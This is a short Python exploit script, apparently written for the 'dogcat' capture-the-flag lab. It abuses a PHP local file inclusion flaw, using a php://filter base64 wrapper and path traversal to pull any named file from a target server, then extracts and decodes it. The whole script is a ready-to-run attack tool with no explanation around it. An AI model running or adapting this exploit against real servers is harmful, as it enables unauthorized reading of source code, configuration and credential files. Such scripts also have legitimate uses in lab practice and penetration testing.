import requests
import base64
import argparse
from bs4 import BeautifulSoup as bs4

def send_request(url, file):
    response = requests.get(f"http://{url}/?view=php://filter/convert.base64-encode/resource=dog/../{file}&ext=")
    return response.text

def extract_from_page(html_content):
    soup = bs4(html_content, 'html.parser')
    div_content = soup.find("div")

    if div_content:
        lines = div_content.get_text().splitlines()
        line = lines[3]
        return line.split('!')[1]
    return None

def main():
    parser = argparse.ArgumentParser(description="Python dogcat PHP filter resource exploit")
    parser.add_argument("-u", "--url", help="IP or URL of the server", required=True)
    parser.add_argument("-f", "--file", help="File or Resource to use", required=True)
    args = vars(parser.parse_args())
    base64_response = send_request(args['url'], args['file'])
    base64_string = extract_from_page(base64_response)
    if base64_string:
        try:
            decoded = base64.b64decode(base64_string)
            print(decoded.decode('utf-8', errors='ignore'))
        except Exception as e:
            print(f"Error decoding base64 content: {e}")
    else:
        print("Base64 string not found in the response.")

if __name__ == "__main__":
    main()